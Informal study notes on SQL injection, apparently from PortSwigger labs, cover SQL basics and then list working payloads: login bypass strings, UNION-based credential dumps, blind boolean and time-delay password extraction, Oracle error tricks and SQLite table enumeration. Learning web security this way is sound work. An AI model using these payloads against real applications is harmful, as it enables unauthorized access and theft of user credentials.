
### Basics : 

- To select different things from a table , we use ' , ' . example : `select username,password from users;`

- Limit : `select * from users LIMIT 1; : one row `
	   LIMIT x,y : skip the first 'x' results , and give just 'y' row . 

- `select * from users where username like 'a%';` : Using the like clause allows you to specify data that isn't an exact match but instead either starts, contains or ends with certain characters by choosing where to place the wildcard character represented by a percentage sign %.

- insert into users (username,password) values ('bob','password123'); : very clear
- update users SET username='root',password='pass123' where username='admin'; : is clear also

- UNION : we need the exact same number of colomns like the first select , and the same datatype

- comments : -- - 


----------------------------------------------------

some payloads and techniques : 
?id=
'
' UNION SELECT username,password FROM users--
1 and 1=2
1 or 1=1
1 and SUBSTRING((SELECT password FROM users WHERE username='admin'),1,1)='x' // keep trynig letters to find the first character in the hash password
'+OR+1=1--
'+UNION+SELECT+BANNER,+NULL+FROM+v$version-- // version of database

admin'--
admin' OR '1'='1
' UNION SELECT username, password FROM users--

union attack : 
you need two conditions : How many columns are being returned from the original query.
			  Which columns returned from the original query are of a suitable data type to hold the results from the injected query.
Determining the number of columns required : 
' UNION SELECT NULL--
' UNION SELECT NULL,NULL-- 

until another message error

Finding columns with a useful data type : 

' UNION SELECT 'a',NULL,NULL,NULL--
' UNION SELECT NULL,'a',NULL,NULL--
' UNION SELECT NULL,NULL,'a',NULL--
' UNION SELECT NULL,NULL,NULL,'a'--

in oracle : select null from dual (many things are not the same , goback to portswigger lab n°10)

' UNION SELECT username, password FROM users--
' UNION SELECT username || '~' || password FROM users--  : to select multiple values within a single column

Determine the number of columns that are being returned by the query and which columns contain text data. Verify that the query is returning two columns, both of which contain text, using a payload like the following in the category parameter:

'+UNION+SELECT+'abc','def'#

method : 
1-find the number of columns
2-find the data type of the columns
3-version of the database
4-output the list of table names in the database
5-output the column names of the table
6-output the usernames and passwords


_______________________________________________________________________

Blind sql injection : 
you can inject in somme interesting cookies : 
xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) > 'm  : tjib the first character from the password and compare it with m , so you need to get all the character one by one

' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='a

AND (SELECT 'a' FROM users LIMIT 1)='a : to verify if is exist table users

TrackingId=xyz' AND (SELECT 'a' FROM users WHERE username='administrator')='a : to verify if user has the name administrator

TrackingId=xyz' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>1)='a : to calculate the length of the password

_________________________________________________________________________
in oracle database : 
you need to add a table name in select
limit 1      ===          where rownum=1

TrackingId=xyz'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'

__________________________________________________________________________

TrackingId=' AND 1=CAST((SELECT password FROM users LIMIT 1) AS int)--       : retrieve data from error , cast convert (anything) to as (.....)

____________________________________________________________________________

The COUNT() function returns the number of rows that matches a specified criterion.

The CASE expression goes through conditions and returns a value when the first condition is met (like an if-then-else statement). So, once a condition is true, it will stop reading and return the result. If no conditions are true, it returns the value in the ELSE clause.

If there is no ELSE part and no conditions are true, it returns NULL.

___________________________________________________________________________
time delay sqli : 

'; IF (1=2) WAITFOR DELAY '0:0:10'--
'||pg_sleep(10)--
x' SELECT+CASE+WHEN+(username='administrator'+AND+SUBSTRING(password,2,1)='a')+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--

__________________________________________________________________________________

you can find sql injection in xml , in the parameter of the xml , if you see a number =4 , try 2+2 and see if the same

___________________________________________________________________________
XOR(if(now()=sysdate(),sleep(5),0))XOR


---
#### sqllite : 

==get the tables :== (SELECT group_concat(tbl_name) FROM sqlite_master WHERE type='table' and tbl_name NOT like 'sqlite_%')

==get the colomuns==
(SELECT sql FROM sqlite_master WHERE type!='meta' AND sql NOT NULL AND name ='usertable')


==blind sqli (boolean)==

SUBSTR((SELECT password FROM users LIMIT 0,1),1,1)